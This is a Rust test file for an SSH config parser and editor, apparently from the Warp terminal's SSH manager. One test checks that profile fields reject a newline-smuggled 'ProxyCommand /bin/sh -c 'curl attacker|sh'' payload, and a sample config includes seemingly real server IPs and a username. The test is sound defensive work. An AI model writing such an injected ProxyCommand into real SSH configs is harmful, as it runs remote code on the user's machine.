use super::*;

const HAND_WRITTEN: &str = "\
# Read more about SSH config files: https://linux.die.net/man/5/ssh_config
Host PangyoA6000
    HostName 10.0.0.1 #HostName 106.245.149.181
    Port 50000
    User bch

Host oracle
    HostName 138.2.125.242
    Port 22
    User ubuntu
    IdentityFile ~/.ssh/oracle_free_a1
    IdentitiesOnly yes
";

fn host_blocks(config: &ConfigFile) -> Vec<&HostBlock> {
    config
        .segments
        .iter()
        .filter_map(|segment| match segment {
            Segment::Host(block) => Some(block),
            Segment::Raw(_) => None,
        })
        .collect()
}

fn config_of(segments: Vec<Segment>) -> ConfigFile {
    ConfigFile {
        segments,
        eol: LF.to_string(),
    }
}

fn profile_of(config: &ConfigFile, idx: usize) -> SshHostProfile {
    host_blocks(config)[idx].to_profile(0).unwrap()
}

fn write_config(dir: &Path, contents: &str) -> PathBuf {
    let path = dir.join("config");
    fs::write(&path, contents).unwrap();
    path
}

fn read(path: &Path) -> String {
    fs::read_to_string(path).unwrap()
}

#[test]
fn parses_hand_written_hosts_into_profiles() {
    let config = parse(HAND_WRITTEN);
    assert_eq!(host_blocks(&config).len(), 2);

    let pangyo = profile_of(&config, 0);
    assert_eq!(pangyo.name, "PangyoA6000");
    assert_eq!(pangyo.host, "10.0.0.1");
    assert_eq!(pangyo.port, 50000);
    assert_eq!(pangyo.user.as_deref(), Some("bch"));

    let oracle = profile_of(&config, 1);
    assert_eq!(oracle.host, "138.2.125.242");
    assert_eq!(oracle.port, 22);
    assert_eq!(
        oracle.identity_file.as_deref(),
        Some("~/.ssh/oracle_free_a1")
    );
}

#[test]
fn roundtrip_is_byte_identical() {
    assert_eq!(serialize(&parse(HAND_WRITTEN)), HAND_WRITTEN);
}

#[test]
fn updating_a_hand_written_host_preserves_unknown_directives_and_comments() {
    let mut config = parse(HAND_WRITTEN);
    let mut profile = profile_of(&config, 1);
    profile.user = Some("root".to_string());

    match &mut config.segments[..] {
        [_, _, Segment::Host(block)] => block.apply_profile(&profile).unwrap(),
        _ => panic!("expected the oracle stanza to be the last segment"),
    }

    let updated = serialize(&config);
    assert!(updated.contains("    User root"));
    assert!(updated.contains("    IdentitiesOnly yes"));
    assert!(updated.contains("    HostName 10.0.0.1 #HostName 106.245.149.181"));
    assert!(updated.contains("# Read more about SSH config files"));
    assert!(updated.contains(&format!("{WARP_ID_PREFIX} {}", profile.id)));
}

#[test]
fn warp_metadata_roundtrips_through_comments() {
    let id = Uuid::new_v4();
    let source = format!(
        "{WARP_ID_PREFIX} {id}\n{WARP_TAGS_PREFIX} prod,web\nHost app\n    HostName 10.0.0.9\n"
    );

    let profile = profile_of(&parse(&source), 0);
    assert_eq!(profile.id, id);
    assert_eq!(profile.tags, vec!["prod".to_string(), "web".to_string()]);

    assert_eq!(serialize(&parse(&source)), source);
}

#[test]
fn proxy_jump_roundtrips_including_per_hop_identity_files() {
    let mut profile = SshHostProfile::new("app".to_string(), "10.0.0.9".to_string());
    profile.jump_hosts = vec![
        SshJumpHost {
            source_profile_id: None,
            host: "bastion".to_string(),
            user: Some("ops".to_string()),
            port: 2222,
            identity_file: Some("~/.ssh/bastion_key".to_string()),
        },
        SshJumpHost {
            source_profile_id: None,
            host: "relay".to_string(),
            user: None,
            port: default_ssh_port(),
            identity_file: None,
        },
    ];

    let mut block = HostBlock::new_for(&profile, LF).unwrap();
    let rendered = serialize(&config_of(vec![Segment::Host(block.clone())]));
    assert!(rendered.contains("    ProxyJump ops@bastion:2222,relay"));

    let parsed = profile_of(&parse(&rendered), 0);
    assert_eq!(parsed.jump_hosts.len(), 2);
    assert_eq!(parsed.jump_hosts[0].user.as_deref(), Some("ops"));
    assert_eq!(parsed.jump_hosts[0].port, 2222);
    assert_eq!(
        parsed.jump_hosts[0].identity_file.as_deref(),
        Some("~/.ssh/bastion_key")
    );
    assert_eq!(parsed.jump_hosts[1].host, "relay");
    assert_eq!(parsed.jump_hosts[1].port, default_ssh_port());
    assert!(parsed.jump_hosts[1].identity_file.is_none());

    profile.jump_hosts.clear();
    block.apply_profile(&profile).unwrap();
    let cleared = serialize(&config_of(vec![Segment::Host(block)]));
    assert!(!cleared.contains("ProxyJump"));
    assert!(!cleared.contains(WARP_JUMP_IDENTITIES_PREFIX));
}

#[test]
fn default_port_is_not_written_out() {
    let profile = SshHostProfile::new("app".to_string(), "10.0.0.9".to_string());
    let block = HostBlock::new_for(&profile, LF).unwrap();
    let rendered = serialize(&config_of(vec![Segment::Host(block)]));
    assert!(!rendered.contains("Port"));
}

#[test]
fn removing_only_drops_warp_owned_stanzas() {
    let id = Uuid::new_v4();
    let dir = tempfile::tempdir().unwrap();
    let path = write_config(
        dir.path(),
        &format!(
            "Host manual\n    HostName 10.0.0.1\n\n{WARP_ID_PREFIX} {id}\nHost owned\n    HostName 10.0.0.2\n"
        ),
    );

    remove_profile_at(&path, id).unwrap();

    let updated = read(&path);
    assert!(updated.contains("Host manual"));
    assert!(!updated.contains("Host owned"));
    assert!(!updated.contains(WARP_ID_PREFIX));
}

#[test]
fn host_patterns_are_not_profiles_and_are_never_written() {
    let dir = tempfile::tempdir().unwrap();
    let path = write_config(
        dir.path(),
        "Host *\n    ServerAliveInterval 60\n\nHost prod\n    HostName 10.0.0.1\n",
    );

    let profiles = load_profiles_at(&path).unwrap();
    assert_eq!(profiles.len(), 1);
    assert_eq!(profiles[0].name, "prod");

    let mut config = parse(&read(&path));
    let pattern = match &mut config.segments[0] {
        Segment::Host(block) => block,
        Segment::Raw(_) => panic!("expected the pattern stanza first"),
    };
    let profile = SshHostProfile::new("*".to_string(), "*".to_string());
    assert!(pattern.apply_profile(&profile).is_err());

    let mut renamed = profiles[0].clone();
    renamed.name = "web*".to_string();
    assert!(upsert_profile_at(&path, &renamed).is_err());

    let unchanged = profiles[0].clone();
    upsert_profile_at(&path, &unchanged).unwrap();
    let updated = read(&path);
    assert!(!updated.contains("HostName *"));
    assert!(updated.contains("Host *\n    ServerAliveInterval 60\n"));
}

#[test]
fn match_blocks_are_not_absorbed_by_the_preceding_host() {
    let source = "\
Host prod
    HostName 10.0.0.1

Match host bastion exec \"true\"
    User deployer
    ProxyCommand /usr/bin/corp-proxy %h %p
";
    let mut config = parse(source);
    assert_eq!(host_blocks(&config).len(), 1);

    let mut profile = profile_of(&config, 0);
    assert!(profile.user.is_none());
    assert_eq!(serialize(&config), source);

    profile.user = Some("bch".to_string());
    profile.host = "10.9.9.9".to_string();
    match &mut config.segments[0] {
        Segment::Host(block) => block.apply_profile(&profile).unwrap(),
        Segment::Raw(_) => panic!("expected the prod stanza first"),
    }

    let updated = serialize(&config);
    assert!(updated.contains("Match host bastion exec \"true\"\n    User deployer\n"));
    assert!(updated.contains("    HostName 10.9.9.9"));
    assert!(updated.contains("    User bch"));
}

#[test]
fn control_characters_in_profile_fields_are_rejected() {
    let dir = tempfile::tempdir().unwrap();
    let path = write_config(dir.path(), "Host keep\n    HostName 10.0.0.1\n");
    let original = read(&path);

    let injected = "evil\n    ProxyCommand /bin/sh -c 'curl attacker|sh'";
    let mut by_name = SshHostProfile::new(injected.to_string(), "10.8.8.8".to_string());
    assert!(upsert_profile_at(&path, &by_name).is_err());

    by_name.name = "evil".to_string();
    by_name.host = injected.to_string();
    assert!(upsert_profile_at(&path, &by_name).is_err());

    by_name.host = "10.8.8.8".to_string();
    by_name.tags = vec![injected.to_string()];
    assert!(upsert_profile_at(&path, &by_name).is_err());

    by_name.tags.clear();
    by_name.user = Some(injected.to_string());
    assert!(upsert_profile_at(&path, &by_name).is_err());

    by_name.user = None;
    by_name.identity_file = Some("~/.ssh/id\rX".to_string());
    assert!(upsert_profile_at(&path, &by_name).is_err());

    by_name.identity_file = None;
    by_name.jump_hosts = vec![SshJumpHost {
        source_profile_id: None,
        host: injected.to_string(),
        user: None,
        port: default_ssh_port(),
        identity_file: None,
    }];
    assert!(upsert_profile_at(&path, &by_name).is_err());

    assert_eq!(read(&path), original);
    assert!(!dir.path().join("config.warp.bak").exists());
}

#[test]
fn editing_a_stanza_keeps_inline_comments_on_the_lines_it_rewrites() {
    let source = "\
Host prod # main box
    HostName 10.0.0.1 #HostName 106.245.149.181
    User bch
";
    let mut config = parse(source);
    let mut profile = profile_of(&config, 0);
    profile.host = "10.0.0.2".to_string();
    profile.name = "prod2".to_string();

    match &mut config.segments[0] {
        Segment::Host(block) => block.apply_profile(&profile).unwrap(),
        Segment::Raw(_) => panic!("expected the prod stanza first"),
    }

    let updated = serialize(&config);
    assert!(updated.contains("Host prod2 # main box\n"));
    assert!(updated.contains("    HostName 10.0.0.2 #HostName 106.245.149.181\n"));
}

#[test]
fn include_ends_the_stanza_so_new_directives_land_before_it() {
    let source = "Host a\n    HostName 1.1.1.1\n\nInclude ~/.ssh/conf.d/*.conf\n";
    let mut config = parse(source);
    assert_eq!(host_blocks(&config).len(), 1);

    let mut profile = profile_of(&config, 0);
    profile.user = Some("u".to_string());
    match &mut config.segments[0] {
        Segment::Host(block) => block.apply_profile(&profile).unwrap(),
        Segment::Raw(_) => panic!("expected the a stanza first"),
    }

    let updated = serialize(&config);
    let user_at = updated.find("    User u").unwrap();
    let include_at = updated.find("Include ").unwrap();
    assert!(user_at < include_at);
}

#[test]
fn ipv6_jump_hosts_roundtrip_with_brackets() {
    let mut profile = SshHostProfile::new("app".to_string(), "10.0.0.9".to_string());
    profile.jump_hosts = vec![
        SshJumpHost {
            source_profile_id: None,
            host: "2001:db8::1".to_string(),
            user: Some("ops".to_string()),
            port: 2222,
            identity_file: None,
        },
        SshJumpHost {
            source_profile_id: None,
            host: "2001:db8::2".to_string(),
            user: None,
            port: default_ssh_port(),
            identity_file: None,
        },
    ];

    let block = HostBlock::new_for(&profile, LF).unwrap();
    let rendered = serialize(&config_of(vec![Segment::Host(block)]));
    assert!(rendered.contains("    ProxyJump ops@[2001:db8::1]:2222,[2001:db8::2]"));

    let parsed = profile_of(&parse(&rendered), 0);
    assert_eq!(parsed.jump_hosts[0].host, "2001:db8::1");
    assert_eq!(parsed.jump_hosts[0].port, 2222);
    assert_eq!(parsed.jump_hosts[0].user.as_deref(), Some("ops"));
    assert_eq!(parsed.jump_hosts[1].host, "2001:db8::2");
    assert_eq!(parsed.jump_hosts[1].port, default_ssh_port());
}

#[test]
fn bare_ipv6_jump_host_is_not_split_into_host_and_port() {
    let jump_hosts = parse_proxy_jump("ops@2001:db8::1", &[], &[]).unwrap();
    assert_eq!(jump_hosts[0].host, "2001:db8::1");
    assert_eq!(jump_hosts[0].port, default_ssh_port());
    assert!(parse_proxy_jump("[2001:db8::1]:notaport", &[], &[]).is_err());
}

#[test]
fn removing_a_hand_written_host_is_an_error() {
    let dir = tempfile::tempdir().unwrap();
    let source = "Host manual\n    HostName 10.0.0.1\n";
    let path = write_config(dir.path(), source);
    let id = load_profiles_at(&path).unwrap()[0].id;

    assert!(remove_profile_at(&path, id).is_err());
    assert_eq!(read(&path), source);
}

#[test]
fn an_explicit_default_port_survives_a_rewrite() {
    let dir = tempfile::tempdir().unwrap();
    let path = write_config(dir.path(), "Host oracle\n    Port 22\n    User ubuntu\n");
    let profile = load_profiles_at(&path).unwrap().remove(0);

    upsert_profile_at(&path, &profile).unwrap();

    assert!(read(&path).contains("    Port 22\n"));
}

#[test]
fn an_unparsable_port_is_reported_instead_of_defaulting_to_22() {
    let dir = tempfile::tempdir().unwrap();
    let path = write_config(dir.path(), "Host prod\n    Port 5000O\n");

    let err = load_profiles_at(&path).unwrap_err().to_string();
    assert!(err.contains("5000O"), "unexpected error: {err}");
}

#[test]
fn crlf_and_a_missing_final_newline_are_preserved() {
    let crlf = "Host prod\r\n    HostName 10.0.0.1\r\n";
    assert_eq!(serialize(&parse(crlf)), crlf);

    let unterminated = "Host prod\n    HostName 10.0.0.1";
    assert_eq!(serialize(&parse(unterminated)), unterminated);

    let dir = tempfile::tempdir().unwrap();
    let path = write_config(dir.path(), crlf);
    let mut profile = load_profiles_at(&path).unwrap().remove(0);
    profile.user = Some("bch".to_string());
    upsert_profile_at(&path, &profile).unwrap();

    let updated = read(&path);
    assert!(updated.contains("    User bch\r\n"), "{updated:?}");
    assert!(!updated.contains("\n\r"), "{updated:?}");
    assert_eq!(
        updated.matches('\n').count(),
        updated.matches("\r\n").count()
    );
}

#[test]
fn warp_comments_only_count_as_metadata_directly_above_a_host() {
    let source = format!(
        "{WARP_TAGS_PREFIX} notes,for,humans\n# a normal comment\nHost a\n    HostName 1.1.1.1\n{WARP_ID_PREFIX} 11111111-1111-1111-1111-111111111111\n"
    );
    let config = parse(&source);
    let profile = profile_of(&config, 0);
    assert!(profile.tags.is_empty());
    assert_eq!(serialize(&config), source);
}

#[test]
fn a_malformed_warp_id_comment_is_kept_as_a_comment() {
    let source = "# warp-id: not-a-uuid\nHost a\n    HostName 1.1.1.1\n";
    let config = parse(source);
    assert!(host_blocks(&config)[0].warp_id.is_none());
    assert_eq!(serialize(&config), source);
}

#[cfg(unix)]
#[test]
fn the_config_and_its_directory_are_created_private() {
    use std::os::unix::fs::PermissionsExt as _;

    let dir = tempfile::tempdir().unwrap();
    let ssh_dir = dir.path().join(".ssh");
    let path = ssh_dir.join("config");
    let profile = SshHostProfile::new("app".to_string(), "10.0.0.9".to_string());

    upsert_profile_at(&path, &profile).unwrap();

    let dir_mode = fs::metadata(&ssh_dir).unwrap().permissions().mode() & 0o777;
    assert_eq!(dir_mode, PRIVATE_DIR_MODE);
    let file_mode = fs::metadata(&path).unwrap().permissions().mode() & 0o777;
    assert_eq!(file_mode, PRIVATE_FILE_MODE);
    assert!(!sibling_path(&path, TEMP_SUFFIX).exists());
}

#[cfg(unix)]
#[test]
fn a_symlinked_config_is_written_through_to_its_target() {
    let dir = tempfile::tempdir().unwrap();
    let target = dir.path().join("dotfiles-config");
    fs::write(&target, "Host prod\n    HostName 10.0.0.1\n").unwrap();
    let path = dir.path().join("config");
    std::os::unix::fs::symlink(&target, &path).unwrap();

    let mut profile = load_profiles_at(&path).unwrap().remove(0);
    profile.user = Some("bch".to_string());
    upsert_profile_at(&path, &profile).unwrap();

    assert!(
        fs::symlink_metadata(&path)
            .unwrap()
            .file_type()
            .is_symlink()
    );
    assert!(read(&target).contains("    User bch"));
}

#[test]
fn the_backup_keeps_the_contents_warp_first_found() {
    let dir = tempfile::tempdir().unwrap();
    let original = "Host prod\n    HostName 10.0.0.1\n";
    let path = write_config(dir.path(), original);

    let mut profile = load_profiles_at(&path).unwrap().remove(0);
    profile.user = Some("first".to_string());
    upsert_profile_at(&path, &profile).unwrap();
    profile.user = Some("second".to_string());
    upsert_profile_at(&path, &profile).unwrap();

    assert_eq!(read(&sibling_path(&path, BACKUP_SUFFIX)), original);
}

#[test]
fn equals_separated_directives_are_understood() {
    let config = parse("Host=work\n    HostName=10.1.1.1\n    Port = 2222\n");
    let profile = profile_of(&config, 0);
    assert_eq!(profile.name, "work");
    assert_eq!(profile.host, "10.1.1.1");
    assert_eq!(profile.port, 2222);
}

#[test]
fn upserting_by_name_never_steals_a_stanza_owned_by_another_id() {
    let other = Uuid::new_v4();
    let dir = tempfile::tempdir().unwrap();
    let path = write_config(
        dir.path(),
        &format!("{WARP_ID_PREFIX} {other}\nHost prod\n    HostName 10.0.0.1\n"),
    );

    let mut duplicate = SshHostProfile::new("prod".to_string(), "10.6.6.6".to_string());
    duplicate.id = Uuid::new_v4();
    upsert_profile_at(&path, &duplicate).unwrap();

    let updated = read(&path);
    assert!(updated.contains(&format!("{WARP_ID_PREFIX} {other}")));
    assert!(updated.contains("    HostName 10.0.0.1"));
    assert!(updated.contains("    HostName 10.6.6.6"));
    assert_eq!(load_profiles_at(&path).unwrap().len(), 2);
}

#[test]
fn quoted_values_are_unquoted() {
    let config = parse("Host prod\n    HostName \"10.0.0.1\"\n");
    assert_eq!(profile_of(&config, 0).host, "10.0.0.1");
}

#[test]
fn a_hand_written_host_keeps_the_same_id_across_loads() {
    let dir = tempfile::tempdir().unwrap();
    let path = write_config(dir.path(), HAND_WRITTEN);

    let first = load_profiles_at(&path).unwrap();
    let second = load_profiles_at(&path).unwrap();

    assert_eq!(first, second);
    assert_ne!(first[0].id, first[1].id);
    assert!(!first[0].id.is_nil());
    assert_eq!(read(&path), HAND_WRITTEN);
}

#[test]
fn a_hand_written_host_id_is_not_derived_from_the_file_it_lives_in() {
    let first_dir = tempfile::tempdir().unwrap();
    let second_dir = tempfile::tempdir().unwrap();
    let source = "Host prod\n    HostName 10.0.0.1\n";

    let first = load_profiles_at(&write_config(first_dir.path(), source)).unwrap();
    let second = load_profiles_at(&write_config(second_dir.path(), source)).unwrap();

    assert_eq!(first[0].id, second[0].id);
}

#[test]
fn repeated_hand_written_aliases_get_distinct_but_stable_ids() {
    let dir = tempfile::tempdir().unwrap();
    let path = write_config(
        dir.path(),
        "Host prod\n    HostName 10.0.0.1\n\nHost prod\n    HostName 10.0.0.2\n",
    );

    let first = load_profiles_at(&path).unwrap();
    let second = load_profiles_at(&path).unwrap();

    assert_ne!(first[0].id, first[1].id);
    assert_eq!(first[0].id, second[0].id);
    assert_eq!(first[1].id, second[1].id);
}

#[test]
fn a_warp_id_comment_still_wins_over_the_derived_id() {
    let id = Uuid::new_v4();
    let dir = tempfile::tempdir().unwrap();
    let path = write_config(
        dir.path(),
        &format!("{WARP_ID_PREFIX} {id}\nHost prod\n    HostName 10.0.0.1\n"),
    );

    assert_eq!(load_profiles_at(&path).unwrap()[0].id, id);
    assert_eq!(load_owned_profile_ids_at(&path).unwrap(), vec![id]);
}

#[test]
fn hand_written_hosts_are_not_reported_as_warp_owned() {
    let id = Uuid::new_v4();
    let dir = tempfile::tempdir().unwrap();
    let path = write_config(
        dir.path(),
        &format!(
            "Host manual\n    HostName 10.0.0.1\n\n{WARP_ID_PREFIX} {id}\nHost owned\n    HostName 10.0.0.2\n\nHost *\n    ServerAliveInterval 60\n"
        ),
    );

    let owned = load_owned_profile_ids_at(&path).unwrap();
    assert_eq!(owned, vec![id]);
    let manual_id = load_profiles_at(&path).unwrap()[0].id;
    assert!(!owned.contains(&manual_id));
}

#[test]
fn jump_host_source_profile_ids_roundtrip_through_comments() {
    let bastion = Uuid::new_v4();
    let mut profile = SshHostProfile::new("app".to_string(), "10.0.0.9".to_string());
    profile.jump_hosts = vec![
        SshJumpHost {
            source_profile_id: None,
            host: "relay".to_string(),
            user: None,
            port: default_ssh_port(),
            identity_file: None,
        },
        SshJumpHost {
            source_profile_id: Some(bastion),
            host: "bastion".to_string(),
            user: Some("ops".to_string()),
            port: 2222,
            identity_file: Some("~/.ssh/bastion_key".to_string()),
        },
    ];

    let mut block = HostBlock::new_for(&profile, LF).unwrap();
    let rendered = serialize(&config_of(vec![Segment::Host(block.clone())]));
    assert!(rendered.contains(&format!("{WARP_JUMP_SOURCES_PREFIX} ,{bastion}\n")));
    assert!(rendered.contains(&format!(
        "{WARP_JUMP_IDENTITIES_PREFIX} ,~/.ssh/bastion_key\n"
    )));

    let parsed = profile_of(&parse(&rendered), 0);
    assert_eq!(parsed.jump_hosts.len(), 2);
    assert_eq!(parsed.jump_hosts[0].host, "relay");
    assert_eq!(parsed.jump_hosts[0].source_profile_id, None);
    assert_eq!(parsed.jump_hosts[0].identity_file, None);
    assert_eq!(parsed.jump_hosts[1].host, "bastion");
    assert_eq!(parsed.jump_hosts[1].source_profile_id, Some(bastion));
    assert_eq!(
        parsed.jump_hosts[1].identity_file.as_deref(),
        Some("~/.ssh/bastion_key")
    );

    profile.jump_hosts.clear();
    block.apply_profile(&profile).unwrap();
    let cleared = serialize(&config_of(vec![Segment::Host(block)]));
    assert!(!cleared.contains(WARP_JUMP_SOURCES_PREFIX));
}

#[test]
fn a_jump_host_pointing_at_a_deleted_profile_keeps_its_source_id() {
    let missing = Uuid::new_v4();
    let source = format!(
        "{WARP_JUMP_SOURCES_PREFIX} {missing}\nHost app\n    HostName 10.0.0.9\n    ProxyJump ops@bastion\n"
    );

    let parsed = profile_of(&parse(&source), 0);
    assert_eq!(parsed.jump_hosts[0].source_profile_id, Some(missing));
    assert_eq!(serialize(&parse(&source)), source);
}

#[test]
fn a_legacy_proxy_jump_without_source_ids_parses_as_unlinked_hops() {
    let source = "Host app\n    HostName 10.0.0.9\n    ProxyJump ops@bastion:2222,relay\n";

    let parsed = profile_of(&parse(source), 0);
    assert_eq!(parsed.jump_hosts.len(), 2);
    assert!(
        parsed
            .jump_hosts
            .iter()
            .all(|jump| jump.source_profile_id.is_none())
    );
    assert_eq!(serialize(&parse(source)), source);
}

#[test]
fn a_malformed_jump_sources_comment_is_kept_as_a_comment() {
    let source = format!(
        "{WARP_JUMP_SOURCES_PREFIX} not-a-uuid\nHost app\n    HostName 10.0.0.9\n    ProxyJump bastion\n"
    );

    let config = parse(&source);
    assert!(host_blocks(&config)[0].jump_sources.is_empty());
    assert_eq!(profile_of(&config, 0).jump_hosts[0].source_profile_id, None);
    assert_eq!(serialize(&config), source);
}

#[test]
fn rewritten_ids_stop_the_normalizer_from_reassigning_on_every_load() {
    use crate::ssh_manager::profile::normalize_ssh_host_profiles;

    let duplicate = Uuid::new_v4();
    let nil = Uuid::nil();
    let dir = tempfile::tempdir().unwrap();
    let path = write_config(
        dir.path(),
        &format!(
            "{WARP_ID_PREFIX} {nil}\nHost broken\n    HostName 10.0.0.1\n\n{WARP_ID_PREFIX} {duplicate}\nHost first\n    HostName 10.0.0.2\n\n{WARP_ID_PREFIX} {duplicate}\nHost second\n    HostName 10.0.0.3\n\nHost manual\n    HostName 10.0.0.4\n"
        ),
    );

    let mut profiles = load_profiles_at(&path).unwrap();
    assert_eq!(normalize_ssh_host_profiles(&mut profiles).len(), 2);
    let ids = profiles
        .iter()
        .map(|profile| profile.id)
        .collect::<Vec<_>>();
    rewrite_profile_ids_at(&path, &ids).unwrap();

    let mut reloaded = load_profiles_at(&path).unwrap();
    assert_eq!(reloaded, profiles);
    assert!(normalize_ssh_host_profiles(&mut reloaded).is_empty());

    let updated = read(&path);
    assert!(!updated.contains(&nil.to_string()));
    assert_eq!(updated.matches(WARP_ID_PREFIX).count(), 3);
    assert!(updated.contains("Host manual\n    HostName 10.0.0.4\n"));
}

#[test]
fn rewriting_unchanged_ids_leaves_the_file_alone() {
    let dir = tempfile::tempdir().unwrap();
    let source = format!(
        "{WARP_ID_PREFIX} {}\nHost owned\n    HostName 10.0.0.1\n\nHost manual\n    HostName 10.0.0.2\n",
        Uuid::new_v4()
    );
    let path = write_config(dir.path(), &source);
    let ids = load_profiles_at(&path)
        .unwrap()
        .iter()
        .map(|profile| profile.id)
        .collect::<Vec<_>>();

    rewrite_profile_ids_at(&path, &ids).unwrap();

    assert_eq!(read(&path), source);
    assert!(!sibling_path(&path, BACKUP_SUFFIX).exists());
}

#[test]
fn rewriting_ids_against_a_config_that_changed_underneath_is_an_error() {
    let dir = tempfile::tempdir().unwrap();
    let source = "Host a\n    HostName 10.0.0.1\n";
    let path = write_config(dir.path(), source);

    assert!(rewrite_profile_ids_at(&path, &[Uuid::new_v4(), Uuid::new_v4()]).is_err());
    assert_eq!(read(&path), source);
    assert!(!sibling_path(&path, BACKUP_SUFFIX).exists());
}

#[cfg(unix)]
#[test]
fn the_original_file_permissions_are_preserved() {
    use std::os::unix::fs::PermissionsExt as _;

    let dir = tempfile::tempdir().unwrap();
    let path = write_config(dir.path(), "Host prod\n    HostName 10.0.0.1\n");
    fs::set_permissions(&path, fs::Permissions::from_mode(0o640)).unwrap();

    let mut profile = load_profiles_at(&path).unwrap().remove(0);
    profile.user = Some("bch".to_string());
    upsert_profile_at(&path, &profile).unwrap();

    let mode = fs::metadata(&path).unwrap().permissions().mode() & 0o777;
    assert_eq!(mode, 0o640);
}
